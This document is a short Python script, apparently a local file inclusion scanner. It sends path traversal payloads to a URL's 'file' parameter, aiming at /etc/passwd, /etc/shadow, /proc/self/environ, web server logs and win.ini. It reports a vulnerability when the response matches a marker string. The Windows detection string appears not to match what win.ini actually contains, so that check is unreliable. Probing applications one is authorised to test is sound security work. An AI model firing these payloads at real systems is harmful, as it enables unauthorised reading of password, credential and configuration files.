import requests

def check_lfi(url):
    payloads = [
        "../../../etc/passwd",                 # Basic LFI payload
        "../../../../../../../../etc/passwd",   # Deep traversal payload
        "../../../../../windows/win.ini",      # Windows path payload
        "../../../proc/self/environ",          # Process environment payload
        "../../../../../../../../var/log/apache/access.log",  # Apache log payload
        "../../../../../../../../etc/hosts",    # Hosts file payload
        "../../../../../../../../etc/resolv.conf",  # Resolv.conf payload
        "../../../etc/shadow",                 # Shadow file payload
        "../../../etc/hostname",               # Hostname file payload
        # Add more payloads here to simulate different LFI scenarios
    ]

    for payload in payloads:
        response = requests.get(url, params={"file": payload})
        if "root:" in response.text or "Windows Registry Editor" in response.text:
            return "LFI vulnerability detected with payload: {}".format(payload), 2
    
    return "No LFI vulnerability detected.", 1
    pass